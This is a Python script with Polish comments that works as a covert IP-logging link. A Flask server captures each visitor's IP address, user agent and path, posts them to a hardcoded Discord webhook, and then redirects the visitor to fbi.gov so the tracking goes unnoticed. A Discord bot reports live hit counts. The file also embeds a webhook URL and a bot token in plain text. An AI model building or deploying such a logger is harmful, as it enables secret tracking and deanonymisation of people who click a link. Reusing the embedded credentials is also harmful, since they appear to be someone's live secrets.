import threading
import datetime
import os
import sys

# Próba importu z auto-instrukcją
try:
    import requests
    from flask import Flask, redirect, request
    import discord
    from discord.ext import commands
    import asyncio
except ImportError:
    print("❌ Brak bibliotek! Uruchom: pip install flask discord.py requests")
    if os.environ.get('NETLIFY'):
        sys.exit(0) # Nie psuj buildu na Netlify
    sys.exit(1)

# ===== KONFIGURACJA =====
REDIRECT_URL = 'https://www.fbi.gov/'
WEBHOOK_URL  = 'https://discordapp.com/api/webhooks/1478462193635950602/5BBfIfYwu8V9mD2nyARuELThG1Yr2zE_YKmiXvQESarqNIlArqq27f8uXabd8lq7lfuE'
BOT_TOKEN    = 'MTQ3ODQ4MjY1MDA3NDMxNjg4MQ.Gecy9t.Mn6UlZ6buzL6CHnxEApxmRSNPiwYPj8eYZohzg'
PREFIX       = '.'
# Netlify używa zmiennej PORT, lokalnie użyjemy 80
PORT         = int(os.environ.get('PORT', 80))
# ========================

total_hits = 0
active_message = None
bot_loop = None

# --- BOTA KONFIGURACJA ---
bot = commands.Bot(command_prefix=PREFIX, intents=discord.Intents.all())

def send_webhook(ip, user_agent, host, path):
    payload = {
        "embeds": [{
            "title": "🌐 Nowe Wejście (Python)",
            "color": 0x24292e,
            "fields": [
                {"name": "🖥️ IP", "value": f"`{ip}`", "inline": True},
                {"name": "📄 Ścieżka", "value": f"`{path}`", "inline": True},
                {"name": "� Suma", "value": f"`{total_hits}`", "inline": True},
                {"name": "🔍 User-Agent", "value": f"`{user_agent[:250]}`", "inline": False}
            ],
            "timestamp": datetime.datetime.utcnow().isoformat()
        }]
    }
    try: requests.post(WEBHOOK_URL, json=payload, timeout=5)
    except: pass

async def update_stats():
    global active_message
    if not active_message: return
    embed = discord.Embed(title="📊 STATYSTYKI — NA ŻYWO", color=0x5865F2, timestamp=datetime.datetime.utcnow())
    embed.add_field(name="📈 ŁĄCZNIE WEJŚĆ", value=f"**{total_hits}**", inline=True)
    try: await active_message.edit(content=None, embed=embed)
    except: active_message = None

# --- SERWER REDIRECTÓW ---
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def handle_redirect(path):
    global total_hits
    total_hits += 1
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    if bot_loop:
        asyncio.run_coroutine_threadsafe(update_stats(), bot_loop)
    send_webhook(ip, request.headers.get('User-Agent', 'Brak'), request.headers.get('Host', 'Brak'), f"/{path}")
    return redirect(REDIRECT_URL)

def run_flask():
    print(f"📡 Flask startuje na porcie {PORT}...")
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

# --- KOMENDY BOTA ---
@bot.event
async def on_ready():
    global bot_loop
    bot_loop = asyncio.get_event_loop()
    print(f'✅ Bot gotowy: {bot.user}')

@bot.command(name='start')
async def start_monitor(ctx):
    global total_hits, active_message
    total_hits = 0
    active_message = await ctx.send(embed=discord.Embed(title="🚀 Start monitorowania...", color=0xFFA500))
    await ctx.message.delete()

# --- URUCHOMIENIE ---
if __name__ == "__main__":
    if os.environ.get('NETLIFY'):
        print("Netlify build — Bot i serwer Flask nie mogą działać w tle na Netlify.")
        print("Bot zostanie uruchomiony, ale Netlify może go zabić po 15 min.")
    
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"❌ Błąd logowania bota: {e}")
        if os.environ.get('NETLIFY'): sys.exit(0)
